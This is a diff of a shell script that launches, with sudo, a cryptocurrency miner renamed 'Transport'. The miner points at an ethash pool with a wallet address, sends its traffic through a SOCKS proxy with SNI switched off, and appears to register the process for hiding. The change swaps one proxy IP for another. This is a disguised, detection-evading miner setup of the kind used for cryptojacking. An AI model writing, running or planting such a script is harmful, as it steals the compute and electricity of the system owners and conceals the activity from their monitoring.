@@ -16,4 +16,4 @@ ph add Transport
 sleep 9
 ph add Transport
 sleep 30
-sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 5.161.86.206:1080 --dns-https-server 1.1.1.1
+sudo ./Transport -a ethash -o ethash.unmineable.com:3333 -u BABYDOGE:0x8fb54cceed6253b674c557210d8d23c29fb49e74.bot -p x -w Trans --no-sni  --proxy 140.238.246.254:1080 --dns-https-server 1.1.1.1
